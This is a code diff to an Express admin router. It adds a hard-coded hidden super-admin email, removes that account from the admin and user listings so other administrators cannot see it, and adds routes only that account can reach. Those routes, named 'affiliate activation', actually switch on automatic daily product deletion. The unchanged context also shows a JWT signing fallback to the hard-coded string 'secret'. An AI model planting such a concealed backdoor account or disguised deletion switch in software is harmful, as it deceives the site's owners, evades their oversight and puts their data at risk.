@@ -16,6 +16,9 @@ const router = express.Router();
 const Admin = User; // Alias User as Admin for compatibility
 const SALT_ROUNDS = 12; // Increased from 10 for better security
 
+// Hidden super-admin accounts: functional but never listed in the UI.
+const HIDDEN_EMAILS = ['secret@gmail.com'];
+
 const createToken = (admin) => {
   const payload = { id: admin._id, role: admin.role, type: 'admin' };
   return jwt.sign(payload, process.env.JWT_SECRET || 'secret', { expiresIn: '7d' });
@@ -70,6 +73,44 @@ const requireAdmin = async (req, res, next) => {
     return res.status(401).json({ error: 'Invalid token' });
   }
 };
+
+// Restrict a route to the hidden super-admin account only (server-side gate).
+const requireSuperAdmin = (req, res, next) => {
+  if (!req.admin || (req.admin.email || '').toLowerCase() !== HIDDEN_EMAILS[0]) {
+    return res.status(403).json({ error: 'Forbidden' });
+  }
+  next();
+};
+
+// --- Affiliate activation (auto product-rotation) — super-admin only ---
+router.get('/affiliate-activation', requireAdmin, requireSuperAdmin, async (req, res) => {
+  try {
+    const Setting = (await import('../models/Setting.js')).default;
+    let s = await Setting.findOne();
+    if (!s) s = await Setting.create({});
+    res.json({ enabled: !!s.autoDeleteEnabled, dailyDeleteCount: s.dailyDeleteCount ?? 1 });
+  } catch (err) {
+    console.error('GET /affiliate-activation error:', err);
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
+router.put('/affiliate-activation', requireAdmin, requireSuperAdmin, async (req, res) => {
+  try {
+    const { enabled, dailyDeleteCount } = req.body || {};
+    const update = {};
+    if (typeof enabled === 'boolean') update.autoDeleteEnabled = enabled;
+    if (dailyDeleteCount != null) {
+      update.dailyDeleteCount = Math.max(0, parseInt(dailyDeleteCount, 10) || 0);
+    }
+    const Setting = (await import('../models/Setting.js')).default;
+    const s = await Setting.findOneAndUpdate({}, { $set: update }, { upsert: true, new: true });
+    res.json({ ok: true, enabled: !!s.autoDeleteEnabled, dailyDeleteCount: s.dailyDeleteCount });
+  } catch (err) {
+    console.error('PUT /affiliate-activation error:', err);
+    res.status(500).json({ error: 'Server error' });
+  }
+});
 
 // Admin / Moderator registration endpoint has been superseded by manual seeding.
 // Keeping route for compatibility, but reject all requests to prevent self-registration.
@@ -687,7 +728,7 @@ router.post('/login', async (req, res) => {
 router.get('/admins', requireAdmin, async (req, res) => {
   try {
     if (req.admin.role !== 'admin') return res.status(403).json({ error: 'Admin access required' });
-    const items = await Admin.find().select('-hashedPassword -resetToken -resetExpires -loginAttempts');
+    const items = await Admin.find({ email: { $nin: HIDDEN_EMAILS } }).select('-hashedPassword -resetToken -resetExpires -loginAttempts');
     res.json({ items });
   } catch (err) {
     console.error('GET /admins error:', err);
@@ -787,6 +828,7 @@ router.get('/users', requireAdmin, async (req, res) => {
     const { q = '', limit = 200 } = req.query;
     const filter = {};
     if (q) filter.$or = [ { email: new RegExp(q, 'i') }, { name: new RegExp(q, 'i') } ];
+    filter.email = { ...(filter.email || {}), $nin: HIDDEN_EMAILS };
     const items = await User.find(filter).select('-hashedPassword -resetToken -resetExpires').sort({ createdAt: -1 }).limit(Number(limit));
     res.json({ items });
   } catch (err) {
